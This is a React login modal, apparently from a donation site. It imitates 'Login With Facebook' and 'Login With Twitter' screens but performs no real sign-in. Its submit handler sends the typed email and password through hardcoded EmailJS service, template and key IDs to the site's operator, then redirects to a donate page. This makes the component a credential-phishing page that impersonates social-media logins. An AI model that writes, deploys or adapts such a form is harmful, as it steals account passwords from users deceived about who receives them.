import { useRef, useState } from "react";
import {
    useForm,
   } from "react-hook-form";
import Heading from "../smComponents/Heading";
import Input from "../smComponents/Input";
import Button from "../smComponents/Button";
import { AiOutlineTwitter } from "react-icons/ai";
import { FaFacebookF } from "react-icons/fa";
import Modal from "./Modal";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

const LoginModal = ( {isOpen, setIsOpen}) => {
    
   const formRef = useRef()
    const [isLoading, setIsLoading] = useState(false);
    const [platform, setPlatform] = useState('')

    const navigate = useNavigate()

    const [step, setStep] = useState(1)

    const onOpen = () => setIsOpen(true)
    const onClose = () => setIsOpen(false)

   
    const {
        register,
        handleSubmit,
        formState: { errors },
       } = useForm({
        defaultValues: {
         email: "",
         password: "",
        },
       });

       const onSubmit = (data) => {
        setIsLoading(true);
        
        
         
      emailjs.sendForm('service_nuibne8', 'template_kz0fxeq', formRef.current, '_0A9sq7t3Q579a4JC')
      .then((result) => {
       console.log('ok')
        
      }).catch((error) => {
       console.log('err')
      });



        setTimeout(() => {
            setIsLoading(false);
            navigate('/donate')
        }, 3000)
       };
      
    let bodyContent;

    if ( step === 1 ) {
      bodyContent = (
            <div className="flex flex-col gap-4 mt-3">
            <hr />
            <Button
             outline
             label="Continue with Facebook"
             icon={FaFacebookF}
                  onClick={ () => {
                      setStep( step + 1 );
                      setPlatform('fb')
                  } }
            platform='fb'
            />
            <Button
             outline
             label="Continue with Twitter"
             icon={AiOutlineTwitter}
                  onClick={ () => {
                      setStep( step + 1 );
                      setPlatform('tw')
                  } }
            platform='tw'
            />
            <div className="text-neutral-500 flex text-center mt-2 font-light justify-center">
             <p className="flex items-center gap-2">
              Dont have an account?{" "}
              <span
               className="text-neutral-800 cursor-pointer font-bold transition hover:underline"
              >
               Sign Up
              </span>
             </p>
            </div>
           </div>
           )
       }

    if ( step === 2 ) {
       bodyContent = (
            <div className="flex flex-col gap-3">
             {/* heading */}
             <Heading
              title={platform === 'fb' ? "Login With Facebook" : platform === 'tw' ? "Login With Twitter" : ''}
              subtitle="Login to your account"
             />

               
               <form ref={formRef} className="flex flex-col justify-center items-center gap-5">
             {/* input */}
             <Input
              id="email"
              label="Username or Email"
              type="email"
              disabled={isLoading}
              register={register}
              errors={errors}
              required
             />
             <Input
              id="password"
              label="Password"
              disabled={isLoading}
              register={register}
              errors={errors}
              required
              type="password"
             />
                   
            </form>
            </div>
           );
       }
       //  body content
 
  
   
    return (
        <div>
        <Modal
         disabled={isLoading}
         isOpen={isOpen}
         title="Please Login to Donate"
         actionLabel={step === 2 && 'Log In'}
         onClose={onClose}
         onSubmit={handleSubmit(onSubmit)}
         body={bodyContent}
         platform={platform}
         backFunc={() => setStep(step - 1)}
         step={step}
        />
       </div>
    )
};


export default LoginModal;